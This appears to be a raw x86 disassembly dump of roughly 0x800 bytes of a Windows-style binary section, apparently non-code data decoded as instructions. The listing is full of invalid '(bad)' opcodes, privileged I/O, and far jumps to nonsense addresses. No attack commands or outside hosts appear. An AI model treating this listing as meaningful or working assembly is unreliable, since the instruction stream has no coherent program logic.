  40f4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4ba:	push   eax
  40f4bb:	sbb    eax,DWORD PTR [eax-0x62895732]
  40f4c1:	jl     0x40f464
  40f4c3:	dec    ebx
  40f4c4:	loop   0x40f50e
  40f4c6:	inc    eax
  40f4c7:	lods   eax,DWORD PTR ds:[esi]
  40f4c8:	or     edx,edx
  40f4ca:	arpl   WORD PTR [ebx-0x49],bx
  40f4cd:	jae    0x40f4e2
  40f4cf:	repnz dec edi
  40f4d1:	scas   eax,DWORD PTR es:[edi]
  40f4d2:	lahf   
  40f4d3:	mov    bh,0x74
  40f4d5:	scas   al,BYTE PTR es:[edi]
  40f4d6:	out    dx,al
  40f4d7:	push   0x12
  40f4d9:	jl     0x40f481
  40f4db:	stos   BYTE PTR es:[edi],al
  40f4dc:	out    dx,eax
  40f4dd:	sbb    al,0x5
  40f4df:	repz mov edi,0x1e900a20
  40f4e5:	mov    al,ds:0x89413ad9
  40f4ea:	inc    esp
  40f4eb:	and    bl,BYTE PTR ds:0x18176b5d
  40f4f1:	mov    esi,0x67624eaa
  40f4f6:	cmp    BYTE PTR [ebp+edx*4+0x6f],bl
  40f4fa:	rcr    DWORD PTR [esi],1
  40f4fc:	cmp    ebp,0x78a0181f
  40f502:	pop    ds
  40f503:	loop   0x40f4de
  40f505:	sbb    al,0x92
  40f507:	int    0x49
  40f509:	daa    
  40f50a:	pop    edi
  40f50b:	or     BYTE PTR [eax+0x4d7592ec],al
  40f511:	std    
  40f512:	test   BYTE PTR [ecx-0x738d9c2],dl
  40f518:	mov    ebp,0xa7b008ce
  40f51d:	xchg   DWORD PTR [ecx],ebx
  40f51f:	pop    eax
  40f520:	test   DWORD PTR es:[edx],ebx
  40f523:	les    eax,FWORD PTR [esi-0x39469d2d]
  40f529:	adc    DWORD PTR [edi+edi*1+0x4b],0xfffffff1
  40f52e:	shl    DWORD PTR [edi-0x5f],0x38
  40f532:	icebp  
  40f533:	lods   eax,DWORD PTR ds:[esi]
  40f534:	xchg   esi,eax
  40f535:	and    ebp,DWORD PTR fs:[ebx+0xffed6d1]
  40f53c:	or     dl,bl
  40f53e:	scas   al,BYTE PTR es:[edi]
  40f53f:	popf   
  40f540:	sub    BYTE PTR [esi+0x34],dl
  40f543:	dec    edi
  40f544:	dec    eax
  40f545:	div    DWORD PTR [edi]
  40f547:	test   BYTE PTR [edx+0x53],cl
  40f54a:	aad    0x2f
  40f54c:	test   BYTE PTR [edx-0x76],ch
  40f54f:	nop
  40f550:	ins    BYTE PTR es:[edi],dx
  40f551:	jb     0x40f5c5
  40f553:	imul   ecx,DWORD PTR [edi-0x4b7c1a60],0xffffff80
  40f55a:	ss loopne 0x40f546
  40f55d:	retf   0xb81b
  40f560:	cmc    
  40f561:	imul   DWORD PTR [ecx]
  40f563:	iret   
  40f564:	std    
  40f565:	inc    BYTE PTR [ebx+0x72]
  40f568:	shl    ecx,0xa8
  40f56b:	xchg   esp,eax
  40f56c:	and    DWORD PTR [eax-0x15],0x33dff4ea
  40f573:	and    ebx,esp
  40f575:	xor    bl,ah
  40f577:	sbb    BYTE PTR ds:0xbde74313,0xab
  40f57e:	arpl   WORD PTR ds:0x10e32304,cx
  40f584:	cs aaa 
  40f586:	sti    
  40f587:	sti    
  40f588:	jge    0x40f56f
  40f58a:	in     al,dx
  40f58b:	lock pop ds
  40f58d:	pop    edi
  40f58e:	data16 fdivr DWORD PTR [esi-0x6b]
  40f592:	(bad)  
  40f593:	mov    ebp,0x67432eb5
  40f598:	test   DWORD PTR [ecx-0x74112ff7],0xfc4e5ed8
  40f5a2:	mov    fs,WORD PTR [ebx-0x3]
  40f5a5:	add    al,0xaf
  40f5a7:	jnp    0x40f570
  40f5a9:	adc    al,0xa6
  40f5ab:	daa    
  40f5ac:	ss add eax,0x777bde60
  40f5b2:	mov    edi,0xa8778c47
  40f5b7:	ja     0x40f575
  40f5b9:	inc    edi
  40f5ba:	bound  edx,QWORD PTR [edi-0x69fbd92a]
  40f5c0:	add    al,0x93
  40f5c2:	pop    edi
  40f5c3:	jo     0x40f563
  40f5c5:	add    al,0x1d
  40f5c8:	add    bh,bl
  40f5ca:	jl     0x40f54e
  40f5cc:	inc    ebp
  40f5cd:	dec    ebp
  40f5ce:	nop
  40f5cf:	inc    edx
  40f5d0:	lds    edx,FWORD PTR [edx+0x51]
  40f5d3:	das    
  40f5d4:	adc    BYTE PTR ds:0xe50038ce,bh
  40f5da:	ins    DWORD PTR es:[edi],dx
  40f5db:	jns    0x40f628
  40f5dd:	sbb    eax,0xb4f12c70
  40f5e2:	js     0x40f5b9
  40f5e4:	jno    0x40f569
  40f5e6:	sbb    al,0x36
  40f5e8:	xor    edx,DWORD PTR [esi]
  40f5ea:	js     0x40f649
  40f5ec:	mov    edx,0x9095228b
  40f5f1:	adc    bl,BYTE PTR [esi-0x43]
  40f5f4:	mov    ecx,0x6582e76f
  40f5f9:	mov    bl,0x1c
  40f5fb:	pop    ss
  40f5fc:	push   es
  40f5fd:	sub    eax,0x38c39e58
  40f602:	mov    cl,0x52
  40f604:	and    eax,0x96b1012e
  40f609:	call   0x317e1a8f
  40f60e:	gs (bad) 
  40f610:	sti    
  40f611:	jmp    0xbc2c:0x68a6897a
  40f618:	push   eax
  40f619:	xor    al,0x7b
  40f61b:	dec    esp
  40f61c:	aaa    
  40f61d:	jns    0x40f5c2
  40f61f:	mov    esi,0xf19695ab
  40f624:	mov    ds:0xac09ff18,eax
  40f629:	gs je  0x40f63d
  40f62c:	dec    ecx
  40f62d:	add    eax,0xc079400d
  40f632:	add    BYTE PTR [edi-0x78],0xee
  40f636:	enter  0x7490,0xff
  40f63a:	adc    bl,dh
  40f63c:	jne    0x40f5e7
  40f63e:	fild   QWORD PTR [edi]
  40f640:	retf   0x7ba1
  40f643:	sub    al,0x72
  40f645:	jbe    0x40f685
  40f647:	push   0x7a
  40f649:	xor    al,0x3d
  40f64b:	rcr    BYTE PTR [ecx],cl
  40f64d:	pop    ebp
  40f64e:	into   
  40f64f:	adc    bl,BYTE PTR [ebx-0x3bbded72]
  40f655:	pop    ds
  40f656:	add    BYTE PTR ds:0xe9b0718c,dh
  40f65c:	idiv   edi
  40f65e:	das    
  40f65f:	hlt    
  40f660:	adc    al,0xdb
  40f662:	xor    edi,DWORD PTR [ebx]
  40f664:	(bad)  
  40f665:	ffreep st(4)
  40f667:	rcr    ch,0x98
  40f66a:	mov    bh,0x2e
  40f66c:	xchg   cl,cl
  40f66e:	(bad)  
  40f670:	inc    edx
  40f671:	xchg   ebx,eax
  40f672:	daa    
  40f673:	fadd   QWORD PTR [eax+0x192b7939]
  40f679:	xchg   esp,eax
  40f67a:	repz les edi,FWORD PTR [ecx+ebx*1+0x10]
  40f67f:	push   0xbf216f06
  40f684:	mov    dh,0xe8
  40f686:	retf   0xe3a2
  40f689:	cmc    
  40f68a:	leave  
  40f68b:	test   BYTE PTR [esp+edi*4-0x86748d2],dh
  40f692:	xchg   edx,eax
  40f693:	imul   edi,DWORD PTR [eax],0xffffffda
  40f696:	jmp    0x2db8:0xb38cdc94
  40f69d:	stos   BYTE PTR es:[edi],al
  40f69e:	sbb    eax,0xb506ca67
  40f6a3:	sub    BYTE PTR [esi],ch
  40f6a5:	mov    ebp,0x7a1aa32b
  40f6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6ab:	std    
  40f6ac:	daa    
  40f6ad:	cld    
  40f6ae:	mov    ecx,0xc03f9f0
  40f6b3:	sbb    eax,0xcee6f563
  40f6b8:	call   0xd16c1f4a
  40f6bd:	ret    0x1766
  40f6c0:	fdiv   DWORD PTR [esi+0x76]
  40f6c3:	dec    eax
  40f6c4:	stos   DWORD PTR es:[edi],eax
  40f6c5:	jns    0x40f653
  40f6c7:	imul   ebp,DWORD PTR [edx],0xffffff86
  40f6ca:	pop    esp
  40f6cb:	jae    0x40f6d5
  40f6cd:	arpl   WORD PTR [bx+0x29],dx
  40f6d1:	push   esi
  40f6d2:	pop    edi
  40f6d3:	aaa    
  40f6d4:	loope  0x40f747
  40f6d6:	mov    bh,0x41
  40f6d8:	jmp    0x9db2:0xa35bfb50
  40f6df:	mov    dh,0x6f
  40f6e1:	std    
  40f6e2:	fdivrp st(1),st
  40f6e4:	push   esi
  40f6e5:	mov    bh,ah
  40f6e7:	inc    esp
  40f6e8:	mov    dh,0x9d
  40f6ea:	ret    0xf2db
  40f6ed:	in     eax,dx
  40f6ee:	mov    ecx,DWORD PTR [esi]
  40f6f0:	dec    esi
  40f6f1:	aaa    
  40f6f2:	jmp    0xb5dda2dd
  40f6f7:	sbb    DWORD PTR [esi+edx*2+0x41],edi
  40f6fb:	jmp    0xb063aa39
  40f700:	cwde   
  40f701:	jg     0x40f6be
  40f703:	cmc    
  40f704:	pop    ecx
  40f705:	push   edi
  40f706:	sub    al,0x94
  40f708:	in     al,dx
  40f709:	adc    al,0x8d
  40f70c:	add    eax,0xffffffba
  40f70f:	inc    ebx
  40f710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f711:	pop    es
  40f712:	(bad)  
  40f713:	cli    
  40f714:	push   edx
  40f715:	and    eax,0x48ba2a40
  40f71a:	ins    DWORD PTR es:[edi],dx
  40f71b:	jne    0x40f79a
  40f71d:	lock outs dx,BYTE PTR ds:[esi]
  40f71f:	cdq    
  40f720:	outs   dx,DWORD PTR ds:[esi]
  40f721:	jmp    0xffc1:0xf0e870ea
  40f728:	push   esp
  40f729:	inc    ebp
  40f72a:	rol    BYTE PTR [eax+edi*8],1
  40f72d:	rcl    BYTE PTR [ebp-0x62],0x59
  40f731:	data16 ins BYTE PTR es:[edi],dx
  40f733:	dec    ebx
  40f734:	add    al,0x7c
  40f736:	shl    DWORD PTR [edi+0x76],cl
  40f739:	shl    bh,1
  40f73b:	rcr    BYTE PTR [ecx+0x60],cl
  40f73e:	aaa    
  40f73f:	push   esp
  40f740:	jns    0x40f75d
  40f742:	xor    esi,ebp
  40f744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f745:	(bad)  
  40f746:	add    DWORD PTR [ecx],edx
  40f748:	imul   edx,DWORD PTR [esi+0x24],0x5d
  40f74c:	mov    WORD PTR [ecx+ebx*4],ss
  40f74f:	lods   al,BYTE PTR ds:[esi]
  40f750:	fldenv [esi-0x7c]
  40f753:	or     eax,0x35169d3b
  40f758:	test   eax,0xc0b0d086
  40f75d:	xchg   esi,eax
  40f75e:	mov    esi,0x9d1ab48e
  40f763:	xor    BYTE PTR [ebx],dh
  40f765:	add    esp,DWORD PTR [edi]
  40f767:	push   0x78ddde0b
  40f76c:	jg     0x40f7e7
  40f76e:	ja     0x40f783
  40f770:	cmp    ecx,DWORD PTR [edi-0xfb3e8c5]
  40f776:	ret    
  40f777:	or     DWORD PTR [esp+ecx*2+0x3e87c2ab],edx
  40f77e:	cdq    
  40f77f:	push   ds
  40f780:	jae    0x40f7d8
  40f782:	dec    esp
  40f783:	pop    edx
  40f784:	jo     0x40f795
  40f786:	ret    0xdb12
  40f789:	sbb    eax,0x46b46e00
  40f78e:	stc    
  40f78f:	and    DWORD PTR [esi-0x4e1300c],ecx
  40f795:	arpl   WORD PTR [ecx],di
  40f797:	mov    cl,0x9b
  40f799:	shr    BYTE PTR [eax+eiz*1+0x42614a92],1
  40f7a0:	mov    bl,0x79
  40f7a2:	xlat   BYTE PTR ds:[ebx]
  40f7a3:	js     0x40f76e
  40f7a5:	push   esi
  40f7a6:	(bad)  
  40f7a7:	jmp    0xf99ec725
  40f7ac:	(bad)  
  40f7ad:	int    0x5b
  40f7af:	js     0x40f792
  40f7b1:	and    esp,DWORD PTR [edx-0x58]
  40f7b4:	mul    DWORD PTR [edi+edx*8+0x23]
  40f7b8:	pushf  
  40f7b9:	fsub   QWORD PTR [ecx-0x1a73e972]
  40f7bf:	cld    
  40f7c0:	adc    eax,0xf7063654
  40f7c5:	xor    eax,0xba6349d0
  40f7ca:	lahf   
  40f7cb:	add    eax,0xa373551f
  40f7d0:	(bad)
  40f7d4:	xor    ch,BYTE PTR [ecx]
  40f7d6:	mov    ebp,0x615601d1
  40f7db:	mov    esp,0xc1499067
  40f7e0:	dec    ecx
  40f7e1:	sbb    eax,0x1f4e1620
  40f7e6:	pushf  
  40f7e7:	xchg   esi,eax
  40f7e8:	js     0x40f789
  40f7ea:	sub    dh,BYTE PTR ds:0xb4c61497
  40f7f0:	mov    WORD PTR [ebx+0xc622929],ss
  40f7f6:	mov    ch,0x13
  40f7f8:	call   0x257d:0xc467d8ce
  40f7ff:	cmp    BYTE PTR [esi+0x47],ch
  40f802:	mov    ds:0xde13a3d2,al
  40f807:	je     0x40f87e
  40f809:	inc    edi
  40f80a:	sub    cl,BYTE PTR es:[ecx]
  40f80d:	push   ecx
  40f80e:	jbe    0x40f7dd
  40f810:	int    0xbf
  40f812:	int3   
  40f813:	or     edx,0x4e
  40f816:	repz sar BYTE PTR [ebx-0x495c5b6],1
  40f81d:	lahf   
  40f81e:	ins    DWORD PTR es:[edi],dx
  40f81f:	sbb    eax,0x663fa8d3
  40f824:	mov    ah,0x6a
  40f826:	sbb    al,0x8f
  40f828:	mov    eax,0x442e79ce
  40f82d:	xchg   ebp,eax
  40f82e:	mov    dh,BYTE PTR [ebp+0x6258dff1]
  40f834:	fadd   QWORD PTR [esi-0x18]
  40f837:	lea    ebp,[ecx+ebx*4]
  40f83a:	in     eax,0x9c
  40f83c:	enter  0xa61e,0x5d
  40f840:	sub    al,0x45
  40f842:	adc    eax,0x6fe5b9fa
  40f847:	jp     0x40f8a0
  40f849:	cwde   
  40f84a:	adc    esi,DWORD PTR [edx-0x14]
  40f84d:	gs loope 0x40f7e5
  40f850:	cs jecxz 0x40f829
  40f853:	xchg   esp,eax
  40f854:	ret    
  40f855:	ret    
  40f856:	aas    
  40f857:	xchg   esi,eax
  40f858:	jno    0x40f8b2
  40f85a:	adc    al,0xce
  40f85c:	jnp    0x40f830
  40f85e:	aaa    
  40f85f:	dec    ecx
  40f860:	sbb    al,0x20
  40f862:	adc    eax,0x8c30e42c
  40f867:	or     esi,DWORD PTR [edi]
  40f869:	bound  ecx,QWORD PTR [edi+0x56569b45]
  40f86f:	or     eax,0x15552634
  40f874:	nop
  40f875:	or     DWORD PTR [ecx-0x5],esi
  40f878:	cmp    eax,0xc2f62d6
  40f87d:	pop    esi
  40f87e:	adc    eax,0xfbfabdbf
  40f883:	repnz lods eax,DWORD PTR ds:[esi]
  40f885:	mov    eax,0xf5a0eacc
  40f88a:	dec    esi
  40f88b:	in     eax,0xa
  40f88d:	es dec ebp
  40f88f:	leave  
  40f890:	xchg   DWORD PTR [esi+0x37],edx
  40f893:	dec    ebp
  40f894:	pop    esp
  40f895:	mov    eax,0xbc080ee7
  40f89a:	push   es
  40f89b:	aas    
  40f89c:	je     0x40f8ee
  40f89e:	pop    ecx
  40f89f:	fld    DWORD PTR [ecx+0x17]
  40f8a2:	xor    DWORD PTR [ebx],ebx
  40f8a4:	mov    ds:0x595e148d,eax
  40f8a9:	(bad)  
  40f8aa:	aaa    
  40f8ab:	sub    ebx,DWORD PTR [ebp-0x23cddc91]
  40f8b1:	fist   DWORD PTR [edi]
  40f8b3:	test   eax,0x6ee5aff4
  40f8b8:	pop    ecx
  40f8b9:	pusha  
  40f8ba:	cmc    
  40f8bb:	pop    DWORD PTR ds:0x47e32976
  40f8c1:	sub    dl,dh
  40f8c3:	jmp    0x8c001b6e
  40f8c8:	outs   dx,DWORD PTR ds:[esi]
  40f8c9:	nop
  40f8ca:	add    BYTE PTR [ecx],bh
  40f8cc:	xchg   ebp,eax
  40f8cd:	jno    0x40f870
  40f8cf:	call   0x14df4f14
  40f8d4:	dec    ecx
  40f8d5:	aam    0x4f
  40f8d7:	stc    
  40f8d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d9:	push   ebx
  40f8da:	fdiv   DWORD PTR [ebx]
  40f8dc:	(bad)  
  40f8dd:	hlt    
  40f8de:	pop    ebp
  40f8df:	lods   al,BYTE PTR ds:[esi]
  40f8e0:	sbb    BYTE PTR [esi-0x5425b6df],dl
  40f8e6:	shr    DWORD PTR [esi],0xeb
  40f8e9:	mov    ds:0xe2d3211a,eax
  40f8ee:	cdq    
  40f8ef:	adc    ecx,DWORD PTR [eax]
  40f8f1:	addr16 das 
  40f8f3:	outs   dx,DWORD PTR ds:[esi]
  40f8f4:	add    dl,BYTE PTR [esi]
  40f8f6:	in     eax,0xec
  40f8f8:	xchg   esp,eax
  40f8f9:	xchg   ebp,eax
  40f8fa:	jno    0x40f8a6
  40f8fc:	sub    DWORD PTR [ebp-0x7d],0xffffff91
  40f900:	repz sti 
  40f902:	inc    ebp
  40f903:	inc    edx
  40f904:	nop
  40f905:	or     DWORD PTR [ebx+0x1583004e],0x58cbaf44
  40f90f:	retf   
  40f910:	ret    0x4466
  40f913:	daa    
  40f914:	aad    0x2e
  40f916:	push   esp
  40f917:	aas    
  40f918:	adc    BYTE PTR [edx-0xc31f80],cl
  40f91e:	push   edx
  40f91f:	imul   esi,DWORD PTR ds:0x198a9f6b,0xc45758c3
  40f929:	sar    BYTE PTR [esi+0x4cbd3fa9],0xb4
  40f930:	push   esp
  40f931:	hlt    
  40f932:	aas    
  40f933:	mov    eax,ds:0xc0e1aeed
  40f938:	xchg   BYTE PTR [eax+0x79],bh
  40f93b:	adc    dl,dh
  40f93d:	jno    0x40f999
  40f93f:	mov    edx,DWORD PTR ds:0x48daa9c0
  40f945:	pop    eax
  40f946:	mov    ch,0xdf
  40f948:	call   0x8269992
  40f94d:	inc    ecx
  40f94e:	dec    esi
  40f94f:	fistp  WORD PTR [ebx-0x68]
  40f952:	leave  
  40f953:	rcr    bh,0x9c
  40f956:	adc    eax,0x828eba18
  40f95b:	and    BYTE PTR [ebp-0x7ec7b145],0x48
  40f962:	fstp   QWORD PTR [esi-0x56]
  40f965:	inc    esp
  40f966:	retf   0xa951
  40f969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f96a:	push   ebp
  40f96b:	mov    ah,0x37
  40f96d:	into   
  40f96e:	cs and al,0xb7
  40f971:	jo     0x40f9e7
  40f973:	scas   eax,DWORD PTR es:[edi]
  40f974:	shl    DWORD PTR [ecx+eax*4],cl
  40f977:	lock mov bh,BYTE PTR [ecx]
  40f97a:	push   edx
  40f97b:	in     eax,0x33
  40f97d:	add    BYTE PTR [edi],dl
  40f97f:	and    BYTE PTR ds:0xc904fa5d,ch
  40f985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f986:	pop    ss
  40f987:	clc    
  40f988:	mov    edi,0x580edb88
  40f98d:	xchg   BYTE PTR [esi+0x3],ch
  40f990:	(bad)  
  40f991:	ffree  st(7)
  40f993:	imul   ebp,DWORD PTR [ecx-0x6cc9c010],0xffffffe9
  40f99a:	div    DWORD PTR [ebx-0x78]
  40f99d:	or     BYTE PTR [edi-0x57],ch
  40f9a0:	cwde   
  40f9a1:	mov    bl,0xe4
  40f9a3:	and    BYTE PTR [eax+0x2b],0xb
  40f9a7:	pmulhuw mm3,QWORD PTR [edx+0x6a1550ff]
  40f9ae:	mov    edi,0x765b1cd7
  40f9b3:	ins    DWORD PTR es:[edi],dx
  40f9b4:	jp     0x40f990
  40f9b6:	pushf  
  40f9b7:	push   ss
  40f9b8:	mov    cl,0x3c
  40f9ba:	or     eax,0xf73a4d57
  40f9bf:	and    dh,BYTE PTR [eax-0x290e991f]
  40f9c5:	and    al,0xa5
  40f9c7:	shl    DWORD PTR [esi-0x406908b0],1
  40f9cd:	cmp    al,0xd8
  40f9cf:	mov    DWORD PTR [ebp-0x7b64188e],edi
  40f9d5:	cwde   
  40f9d6:	sbb    dl,BYTE PTR [ecx-0x5a33902e]
  40f9dc:	fwait
  40f9dd:	mov    bl,dl
  40f9df:	fisub  DWORD PTR [ebp+esi*2+0x5559571f]
  40f9e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e7:	hlt    
  40f9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e9:	(bad)  
  40f9ea:	aad    0x72
  40f9ec:	retf   
  40f9ed:	repnz add BYTE PTR [edi+esi*2-0x47],cl
  40f9f2:	sub    DWORD PTR [edx],0xc129dceb
  40f9f8:	xchg   DWORD PTR [ebx+0x2de92d59],eax
  40f9fe:	fmul   QWORD PTR [eax+0x6a980f95]
  40fa04:	mov    dl,0x40
  40fa06:	jns    0x40f9f3
  40fa08:	pop    ds
  40fa09:	arpl   WORD PTR [ebp-0x73],sp
  40fa0c:	in     eax,dx
  40fa0d:	sbb    eax,0xc5fb9b7f
  40fa12:	sti    
  40fa13:	pop    ss
  40fa14:	je     0x40f9df
  40fa16:	mov    DWORD PTR [ebp+0x33],ebp
  40fa19:	mov    dl,0x2a
  40fa1b:	add    ecx,ecx
  40fa1d:	adc    BYTE PTR [ebx+0x24],0xe2
  40fa21:	jge    0x40f9f8
  40fa23:	dec    edx
  40fa24:	push   eax
  40fa25:	sbb    DWORD PTR [edx],eax
  40fa27:	shl    BYTE PTR [esi+eax*1],0x61
  40fa2b:	or     edx,DWORD PTR [edx+0x27]
  40fa2e:	mov    al,ds:0xe8f5247d
  40fa33:	mov    edx,esi
  40fa35:	test   eax,0xba6ddf5c
  40fa3a:	add    DWORD PTR [ecx+0x672b26b5],edi
  40fa40:	stc    
  40fa41:	adc    BYTE PTR [ebp+edi*2-0x50],ah
  40fa45:	and    BYTE PTR [esi-0x2d7a194c],al
  40fa4b:	bound  edi,QWORD PTR [edi]
  40fa4d:	jl     0x40fac7
  40fa4f:	pop    edi
  40fa50:	out    0xa7,eax
  40fa52:	jbe    0x40fa63
  40fa54:	aaa    
  40fa55:	mov    ah,0x74
  40fa57:	adc    ch,0xca
  40fa5a:	push   edi
  40fa5b:	pop    ebp
  40fa5c:	mov    bh,0x7c
  40fa5e:	ret    
  40fa5f:	ins    BYTE PTR es:[edi],dx
  40fa60:	jle    0x40fa47
  40fa62:	cmp    ch,BYTE PTR [esp+ebp*4-0x59]
  40fa66:	mov    DWORD PTR [eax],esp
  40fa68:	es and al,ch
  40fa6b:	enter  0xde7d,0x23
  40fa6f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40fa71:	js     0x40fa86
  40fa73:	sub    al,0x73
  40fa75:	adc    eax,0xc2e98995
  40fa7a:	ins    DWORD PTR es:[edi],dx
  40fa7b:	xchg   ecx,eax
  40fa7c:	aad    0x46
  40fa7e:	jo     0x40fae1
  40fa80:	pusha  
  40fa81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa82:	adc    DWORD PTR [edi+0x40],eax
  40fa85:	fcom   DWORD PTR [ebp+0x7d]
  40fa88:	out    dx,eax
  40fa89:	pusha  
  40fa8a:	add    eax,0xc669dc2d
  40fa8f:	adc    eax,0x4c2b2ad1
  40fa94:	push   ebp
  40fa95:	and    eax,0x2cce6dd4
  40fa9a:	lock inc ebx
  40fa9c:	sub    BYTE PTR es:[edx+0x2b9ea475],al
  40faa3:	pop    ds
  40faa4:	cwde   
  40faa5:	icebp  
  40faa6:	popf   
  40faa7:	xchg   edx,eax
  40faa8:	fnstenv [edx+esi*2-0x1c]
  40faac:	js     0x40fa70
  40faae:	sub    eax,0x8247e1ee
  40fab3:	push   cs
  40fab4:	lds    esp,FWORD PTR [esi]
  40fab6:	push   edi
  40fab7:	xor    ah,BYTE PTR [esi]
  40fab9:	bt     DWORD PTR [eax+0x1ed33cde],ebx
  40fac0:	getsec 
  40fac2:	rcl    DWORD PTR [ebp-0x62],0x41
  40fac6:	dec    eax
  40fac7:	aas    
  40fac8:	(bad)  
  40faca:	addr16 into 
  40facc:	(bad)
  40facf:	les    esp,FWORD PTR [edi]
  40fad1:	mov    eax,ds:0xad901eb3
  40fad6:	pop    es
  40fad7:	and    BYTE PTR [ecx],ch
  40fad9:	mov    al,0xbd
  40fadb:	xchg   ecx,eax
  40fadc:	add    bh,al
  40fade:	mov    bh,0xdc
  40fae0:	cmp    esp,DWORD PTR [ecx+0x4f9716c7]
  40fae6:	jmp    0x163:0xad15fb8d
  40faed:	push   0x27f3fb7e
  40faf2:	cmp    al,0x8c
  40faf4:	adc    al,0x5c
  40faf6:	mov    ss,WORD PTR [edx+0x3b5caef5]
  40fafc:	cmp    cl,dh
  40fafe:	push   0x60ebc748
  40fb03:	dec    edi
  40fb04:	push   es
  40fb05:	adc    esp,ebx
  40fb07:	inc    ebp
  40fb08:	imul   edi,DWORD PTR ds:0x4743734,0x4b
  40fb0f:	fst    QWORD PTR ds:0x6e454c0a
  40fb15:	js     0x40fb12
  40fb17:	popf   
  40fb18:	mov    bl,0x77
  40fb1a:	inc    edi
  40fb1b:	inc    ebx
  40fb1c:	adc    BYTE PTR [esp+edx*1+0x2a1827fd],al
  40fb23:	sub    al,0x40
  40fb25:	into   
  40fb26:	jne    0x40fb7d
  40fb28:	inc    esi
  40fb29:	imul   esp,DWORD PTR [esp+eax*1],0xce90906
  40fb30:	int    0x1e
  40fb32:	push   0x82ec8357
  40fb37:	push   edx
  40fb38:	cmp    dh,BYTE PTR [edi+ecx*8-0x74]
  40fb3c:	lea    ebx,[edi-0x2c]
  40fb3f:	dec    ebx
  40fb40:	in     eax,dx
  40fb41:	sbb    bh,cl
  40fb43:	push   edi
  40fb44:	fmul   DWORD PTR [edx+0x77]
  40fb47:	sub    al,0x41
  40fb49:	scas   eax,DWORD PTR es:[edi]
  40fb4a:	popf   
  40fb4b:	or     al,0xe9
  40fb4d:	mov    esi,0x85851c65
  40fb52:	add    ecx,DWORD PTR [esi+0x82360c]
  40fb58:	pop    es
  40fb59:	(bad)  
  40fb5a:	das    
  40fb5b:	shl    DWORD PTR [ecx+0x62],cl
  40fb5e:	push   eax
  40fb5f:	sbb    bl,al
  40fb61:	cmc    
  40fb62:	jns    0x40fb2e
  40fb64:	dec    eax
  40fb65:	out    0xb1,al
  40fb67:	cmp    al,0xf3
  40fb69:	mov    edx,0x4a6a1ab1
  40fb6e:	int3   
  40fb6f:	arpl   WORD PTR [ecx+0x17],di
  40fb72:	stos   DWORD PTR es:[edi],eax
  40fb73:	push   es
  40fb74:	dec    ebx
  40fb75:	int3   
  40fb76:	ror    BYTE PTR [eax],1
  40fb78:	add    DWORD PTR [eax-0x40],eax
  40fb7b:	push   ebx
  40fb7c:	fbstp  TBYTE PTR [ebx+0x7e1401c6]
  40fb82:	daa    
  40fb83:	pop    ebx
  40fb84:	sbb    BYTE PTR [esi+0x2518df1c],al
  40fb8a:	mov    DWORD PTR [edi+eax*8+0x4f],edx
  40fb8e:	jge    0x40fb67
  40fb90:	dec    eax
  40fb91:	pop    esi
  40fb92:	mov    WORD PTR [eax],es
  40fb94:	dec    esi
  40fb95:	pop    eax
  40fb96:	rcr    BYTE PTR [ebp+0x3b],cl
  40fb99:	and    edx,DWORD PTR [esi-0x26cd8720]
  40fb9f:	add    al,0xf3
  40fba1:	mov    dl,0x81
  40fba3:	dec    edx
  40fba4:	mov    eax,0xdb3c594c
  40fba9:	sbb    al,0xa1
  40fbab:	xor    al,BYTE PTR [ebx+0x6b]
  40fbae:	popa   
  40fbaf:	dec    edi
  40fbb0:	scas   al,BYTE PTR es:[edi]
  40fbb1:	enter  0x917b,0xc8
  40fbb5:	(bad)  
  40fbb6:	aas    
  40fbb7:	or     al,0x1b
  40fbb9:	call   0xc1f80508
  40fbbe:	hlt    
  40fbbf:	call   0x678e:0xeb2dfcf6
  40fbc6:	mov    BYTE PTR [eax+0x5f86fbca],al
  40fbcc:	(bad)  
  40fbcd:	retf   
  40fbce:	aad    0x36
  40fbd0:	adc    ecx,0xce1324d1
  40fbd6:	inc    esp
  40fbd7:	repnz mov eax,ds:0x9dcc451
  40fbdd:	pop    edi
  40fbde:	add    ecx,ecx
  40fbe0:	fisttp DWORD PTR [edx+0x67a06219]
  40fbe6:	cwde   
  40fbe7:	mov    al,ds:0x9c06a0f1
  40fbec:	or     dl,0x45
  40fbef:	push   ecx
  40fbf0:	sub    eax,0x4ede4dc8
  40fbf5:	adc    al,0x6e
  40fbf7:	hlt    
  40fbf8:	sub    dl,BYTE PTR ds:0xb1229119
  40fbfe:	adc    DWORD PTR [edi],0x23
  40fc01:	repnz push ebp
  40fc03:	popf   
  40fc04:	js     0x40fc79
  40fc06:	mov    dl,0x8d
  40fc08:	inc    esi
  40fc09:	retf   
  40fc0a:	mov    BYTE PTR [edx-0x4c442e8b],0xed
  40fc11:	pop    eax
  40fc12:	mov    bh,0xff
  40fc14:	lgs    edi,FWORD PTR [ebp-0x6552b3e1]
  40fc1b:	sub    BYTE PTR [ecx],al
  40fc1d:	push   es
  40fc1e:	dec    esi
  40fc1f:	cli    
  40fc20:	std    
  40fc21:	loop   0x40fc18
  40fc23:	adc    al,0x10
  40fc25:	inc    eax
  40fc26:	out    dx,al
  40fc27:	dec    ebx
  40fc28:	ret    
  40fc29:	in     eax,0xb8
  40fc2b:	ror    BYTE PTR [ecx+0x5dd24bd8],0x97
  40fc32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc33:	push   ecx
  40fc34:	ins    DWORD PTR es:[edi],dx
  40fc35:	sti    
  40fc36:	sbb    DWORD PTR [edx],esp
  40fc38:	push   esp
  40fc39:	das    
  40fc3a:	arpl   WORD PTR [ebp+0x29400d46],cx
  40fc40:	mov    edx,0xde204fb
  40fc45:	cdq    
  40fc46:	mov    esi,0xedb84bc9
  40fc4b:	sbb    al,0x8
  40fc4d:	aad    0x76
  40fc4f:	ret    0xb795
  40fc52:	in     eax,0xb0
  40fc54:	test   al,0x2
  40fc56:	sub    eax,0x102e6d7
